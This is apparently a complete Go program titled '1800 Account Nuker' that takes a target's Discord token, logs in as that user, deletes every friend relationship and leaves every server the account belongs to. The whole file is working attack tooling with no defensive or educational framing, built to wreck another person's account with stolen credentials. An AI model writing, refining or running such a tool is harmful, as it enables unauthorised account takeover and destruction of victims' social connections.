package main

import (
  "fmt"
  "os"
  "bufio"
  "strings"

  "github.com/fatih/color"
  "github.com/bwmarrin/discordgo"
)

func banner() {
  color.Cyan(` 
      ░░███╗░░░█████╗░░█████╗░░█████╗░
      ░████║░░██╔══██╗██╔══██╗██╔══██╗
      ██╔██║░░╚█████╔╝██║░░██║██║░░██║
      ╚═╝██║░░██╔══██╗██║░░██║██║░░██║
      ███████╗╚█████╔╝╚█████╔╝╚█████╔╝
      ╚══════╝░╚════╝░░╚════╝░░╚════╝░

           Made by amiri#1800
           discord.gg/belaire
	`)
}

func usersfriends(s *discordgo.Session) []string {
  var fid []string
  r, err := s.RelationshipsGet()

  if err != nil {
    fmt.Println("[FAILED TO GET USERS FRIENDS LIST],", err)
  }

  for _, f := range r {
    fid = append(fid, f.ID)
  }

  return fid
}

func usersguilds(s *discordgo.Session) []string {
  var gid []string

  for _, g := range s.State.Guilds {
    gid = append(gid, g.ID)
  }

  return gid
}

var (
  s           *discordgo.Session 
)

func main() {
  reader := bufio.NewReader(os.Stdin)
  fmt.Print("1800 Account Nuker | amiri#1800")
  banner()
  fmt.Print("Targets Token : ")
  token, _ := reader.ReadString('\n')
  banner()

  s, _ = discordgo.New(strings.TrimSpace(token))
  err := s.Open()

  if err != nil {
      fmt.Println("[ERROR OPENING CONNECTION] : ", err)
      return
  }

  fl := usersfriends(s)
  gl := usersguilds(s)

  for _, friend := range fl {
      err := s.RelationshipDelete(friend)
      if err != nil {
          fmt.Println(err)
      }
      fmt.Println("[REMOVED] : " + friend)
   }

  for _, guild := range gl {
      err := s.GuildLeave(guild)
      if err != nil {
        fmt.Println("[FAILED TO LEAVE] : ", err)
                  } else {
        fmt.Println("[LEFT : " + guild)
      }
  }
}
